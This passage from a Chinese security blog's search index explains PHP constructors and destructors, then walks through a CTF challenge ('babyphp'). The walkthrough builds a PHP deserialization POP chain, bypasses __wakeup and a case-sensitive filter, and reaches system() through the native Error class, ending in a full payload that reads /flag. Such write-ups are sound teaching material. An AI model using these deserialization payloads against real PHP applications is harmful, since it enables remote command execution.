class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sex</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>=<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$sex</span>=<span class="hljs-string">&quot;男&quot;</span>,<span class="hljs-variable">$age</span>=<span class="hljs-number">22</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;sex=<span class="hljs-variable">$sex</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age=<span class="hljs-variable">$age</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">say</span>(<span class="hljs-params"></span>)#构造说话方法</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我叫：&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;name.<span class="hljs-string">&quot;，性别：&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;sex.<span class="hljs-string">&quot;，年龄：&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;age;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)#声明一个析构方法</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我觉得我还可以再抢救一下，我的名字叫&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;name;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$Person</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;小明&quot;</span>);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$Person</span>);<span class="hljs-comment">//销毁上面创建的对象$Person</span><br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#我觉得我还可以再抢救一下，我的名字叫小明</span><br></code></pre></td></tr></table></figure><h3 id="construct"><a href="#construct" class="headerlink" title="__construct():"></a>__construct():</h3><p>构造函数，使用new关键字实例化一个对象的时候构造函数自动调用。一个类中只能存在一个构造函数。与析构函数不同的是__construct()可以带有参数（可选，不需要时可以省略），如果构造函数有参数的话，在实例化对象时也要传入对应的参数，例如上述destruct()方法示例中的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$Person</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;小明&quot;</span>);<br><span class="hljs-comment">//也可以将上例中的__construct($name=&quot;&quot;,$sex=&quot;男&quot;,$age=22)参数的值进行修改，随意改，最终参数的值只看实例化传入的，</span><br><span class="hljs-comment">//例如构造函数声明和类Person实例化如下：</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>=<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$sex</span>=<span class="hljs-string">&quot;男&quot;</span>,<span class="hljs-variable">$age</span>=<span class="hljs-number">22</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;sex=<span class="hljs-variable">$sex</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age=<span class="hljs-variable">$age</span>;<br>    &#125;<br>......<br><span class="hljs-variable">$Person</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;小红&quot;</span>,<span class="hljs-string">&quot;女&quot;</span>，<span class="hljs-number">23</span>);<br>......<br><span class="hljs-comment">//则最后运行结果为</span><br><span class="hljs-comment">//我叫：小红，性别：女，年龄：23</span><br></code></pre></td></tr></table></figure><p>如果没有在代码中显示地声明构造函数，类中会默认存在一个没有参数列表并且内容为空的构造函数。如果显示地声明了构造函数则类中的默认构造方法将不会存在。所以构造函数通常用来做一些准备工作，比如为某些参数赋值。</p><p><em><strong>注意：如果显示地声明构造函数，那么它的访问权限必须是public，而且构造函数是在实例化时自动调用的，我们不需要手动调用。</strong></em></p><hr><h2 id="2023ROIS冬令营week4-babyphp"><a href="#2023ROIS冬令营week4-babyphp" class="headerlink" title="2023ROIS冬令营week4 babyphp"></a>2023ROIS冬令营week4 babyphp</h2><p>这题综合性比较强，考察了挺多方面的东西的（大哭</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">backdoor</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>];<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;b&quot;</span>];<br>    <span class="hljs-variable">$d</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;d&quot;</span>];<br>    <span class="hljs-variable">$e</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;e&quot;</span>];<br>    <span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;f&quot;</span>];<br>    <span class="hljs-variable">$g</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;g&quot;</span>];<br>    <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br>    <span class="hljs-variable">$str1</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$class</span>, <span class="hljs-variable">$d</span>, <span class="hljs-variable">$e</span>);<br>    <span class="hljs-variable">$str2</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$class</span>, <span class="hljs-variable">$f</span>, <span class="hljs-variable">$g</span>);<br>    <span class="hljs-variable">$str1</span>(<span class="hljs-variable">$str2</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">popko</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$left</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$right</span>;<br><br><span class="hljs-comment">//    public function __destruct()</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>,<span class="hljs-variable">$args</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-variable language_">$this</span>-&gt;left != <span class="hljs-variable language_">$this</span>-&gt;right) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;left) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;right)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;left) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;right))) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;backdoor is here&quot;</span>;<br>            <span class="hljs-title function_ invoke__">backdoor</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;left = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;right = <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pipimi</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-title function_ invoke__">a</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$c</span> != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>], <span class="hljs-string">&quot;popko&quot;</span>) === <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;:)&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>开局直接一波代码审计。先看后端代码，是反序列化，很明显是希望执行backdoor()后门来进行rce，执行backdoor()方法就要执行popko类里的__call()方法，执行popko里的__call()方法就要调用一个未定义的方法，再往下看发现pipimi类中a类和a方法均未定义，pop链就比较明显了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">pipimi::<span class="hljs-title function_ invoke__">__destruct</span>() =&gt; popko::<span class="hljs-title function_ invoke__">__call</span>() =&gt; <span class="hljs-title function_ invoke__">backdoor</span>()<br></code></pre></td></tr></table></figure><p>再看__call()方法下的规则</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> ((<span class="hljs-variable language_">$this</span>-&gt;left != <span class="hljs-variable language_">$this</span>-&gt;right) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;left) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;right)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;left) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;right))) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;backdoor is here&quot;</span>;<br>            <span class="hljs-title function_ invoke__">backdoor</span>();<br>        &#125;<br></code></pre></td></tr></table></figure><p>要求popko类中的$left和$right不相同但是md5编码和sha1编码强比较相同，因此popko-&gt;left和popko-&gt;right均为数组</p><p>编写poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">backdoor</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">popko</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$left</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$right</span>;<br><br><span class="hljs-comment">//    public function __destruct()</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>,<span class="hljs-variable">$args</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>            <span class="hljs-title function_ invoke__">backdoor</span>();<br>    &#125;<br><br>    <span class="hljs-comment">#public function __wakeup()</span><br>    <span class="hljs-comment">#&#123;</span><br>    <span class="hljs-comment">#    $this-&gt;left = &quot;&quot;;</span><br>    <span class="hljs-comment">#    $this-&gt;right = &quot;&quot;;</span><br>    <span class="hljs-comment">#&#125;</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pipimi</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-title function_ invoke__">a</span>();<br>    &#125;<br>&#125;<br><br><br><span class="hljs-variable">$pop</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">popko</span>();<br><span class="hljs-variable">$pop</span>-&gt;left=[<span class="hljs-number">1</span>];<br><span class="hljs-variable">$pop</span>-&gt;right=[<span class="hljs-number">2</span>];<br><span class="hljs-variable">$pip</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">pipimi</span>();<br><span class="hljs-variable">$pip</span>-&gt;a=<span class="hljs-variable">$pop</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pip</span>);<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406153731384.png"></p><p>漏洞存在，注意到popko类中的__wakeup()方法若执行会将left和right的值清空，_call()方法体的条件无法满足因此要绕过__wakeup()方法，</p><p>将生成的exp进行修改：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;pipimi&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;popko&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;left&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;right&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">2</span>;&#125;&#125;&#125;<br><span class="hljs-comment">//将popko的对象数2改为比2大的数</span><br>O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;pipimi&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;popko&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;left&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;right&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">2</span>;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>注意到函数主体部分有判断语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>], <span class="hljs-string">&quot;popko&quot;</span>) === <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>]);<br>    &#125;<br></code></pre></td></tr></table></figure><p>strrstr()函数区分大小写，但是php类不区分大小写，进行大写绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;pipimi&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Popko&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;left&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;right&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">2</span>;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>GET传入c</p><p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406170242128.png"></p><p>进入后门后查看backdoor()函数体：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">backdoor</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>];<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;b&quot;</span>];<br>    <span class="hljs-variable">$d</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;d&quot;</span>];<br>    <span class="hljs-variable">$e</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;e&quot;</span>];<br>    <span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;f&quot;</span>];<br>    <span class="hljs-variable">$g</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;g&quot;</span>];<br>    <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br>    <span class="hljs-variable">$str1</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$class</span>, <span class="hljs-variable">$d</span>, <span class="hljs-variable">$e</span>);<br>    <span class="hljs-variable">$str2</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$class</span>, <span class="hljs-variable">$f</span>, <span class="hljs-variable">$g</span>);<br>    <span class="hljs-variable">$str1</span>(<span class="hljs-variable">$str2</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>$a是一个类，向类$a中传入参数$b返回值赋值给$class。但是并未定义这样一个满足条件的类，这时候就要去学习php原生类的知识了。查找到原生类ERROR。</p><p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406171445334.png"></p><p>可以看到返回值前面几个字符为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">Error</span>: <span class="hljs-number">12345</span><span class="hljs-comment">#注意引号和字符串&quot;12345&quot;之间有个空格</span><br></code></pre></td></tr></table></figure><p>目的就很明确了，$a为ERROR原生类，$b为一个由命令执行函数和执行的命令组成的字符串。$d和$e代表命令执行函数在ERROR返回值中的首位置和命令执行函数的长度，$f和$g代表所执行的命令在ERROR返回值中的首位置和长度进行截取。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;ERROR&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;systemls&quot;</span><br><span class="hljs-comment">#此时error返回Error: systemls，其中s位于第七个位置，&quot;system&quot;长度6，同理，l位于13，&quot;ls&quot;长度2，则</span><br><span class="hljs-variable">$d</span> = <span class="hljs-number">7</span>;<br><span class="hljs-variable">$e</span> = <span class="hljs-number">6</span>;<br><span class="hljs-variable">$f</span> = <span class="hljs-number">13</span>;<br><span class="hljs-variable">$g</span> = <span class="hljs-number">2</span>;<br></code></pre></td></tr></table></figure><p>GET传入a、b、d、e、f、g对应的值。</p><p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406172912264.png"></p><p>命令执行成功了。</p><p>对b、d、e、f、g进行修改，发现根目录下存在flag。</p><p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406173119381.png"></p><p>最终payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;pipimi&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Popko&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;left&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;right&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">2</span>;&#125;&#125;&#125;&amp;a=<span class="hljs-built_in">Error</span>&amp;b=systemcat /flag&amp;d=<span class="hljs-number">7</span>&amp;e=<span class="hljs-number">6</span>&amp;f=<span class="hljs-number">13</span>&amp;g=<span class="hljs-number">9</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406173259433.png"></p><hr><hr><h1 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h1><h2 id="JavaDeserializeLabs"><a href="#JavaDeserializeLabs" class="headerlink" title="JavaDeserializeLabs"></a>JavaDeserializeLabs</h2><h3 id="lab1-basic"><a href="#lab1-basic" class="headerlink" title="lab1-basic"></a>lab1-basic</h3><h3 id="lab2-ysoserial"><a href="#lab2-ysoserial" class="headerlink" title="lab2-ysoserial"></a>lab2-ysoserial</h3><h3 id="lab3-shiro-jrmp"><a href="#lab3-shiro-jrmp" class="headerlink" title="lab3-shiro-jrmp"></a>lab3-shiro-jrmp</h3><h3 id="lab4-shiro-blind"><a href="#lab4-shiro-blind" class="headerlink" title="lab4-shiro-blind"></a>lab4-shiro-blind</h3><h3 id="lab5-weblogic-readResolve"><a href="#lab5-weblogic-readResolve" class="headerlink" title="lab5-weblogic-readResolve"></a>lab5-weblogic-readResolve</h3><h3 id="lab6-weblogic-resolveProxyClass"><a href="#lab6-weblogic-resolveProxyClass" class="headerlink" title="lab6-weblogic-resolveProxyClass"></a>lab6-weblogic-resolveProxyClass</h3><h3 id="lab7-weblogic-UnicastRef"><a href="#lab7-weblogic-UnicastRef" class="headerlink" title="lab7-weblogic-UnicastRef"></a>lab7-weblogic-UnicastRef</h3><h3 id="lab8-jrmp-unicastRemoteObject"><a href="#lab8-jrmp-unicastRemoteObject" class="headerlink" title="lab8-jrmp-unicastRemoteObject"></a>lab8-jrmp-unicastRemoteObject</h3><h3 id="lab9-proxy"><a href="#lab9-proxy" class="headerlink" title="lab9-proxy"></a>lab9-proxy</h3>]]></content>
    
    
    <categories>
      
      <category>常见漏洞</category>
      
      <category>Web漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>反序列化</tag>
      
      <tag>Java</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HELLO</title>
    <link href="/2023/02/08/HELLO/"/>
    <url>/2023/02/08/HELLO/</url>
    
    <content type="html"><![CDATA[<h1 id="Just-a-test"><a href="#Just-a-test" class="headerlink" title="Just a test:)"></a>Just a test:)</h1><h2 id="My-first-blog"><a href="#My-first-blog" class="headerlink" title="My first blog"></a>My first blog</h2><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">terces</span><span class="hljs-operator">=</span>d712373303471becd6f647f54703e6f5d696b7f6471647f607<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
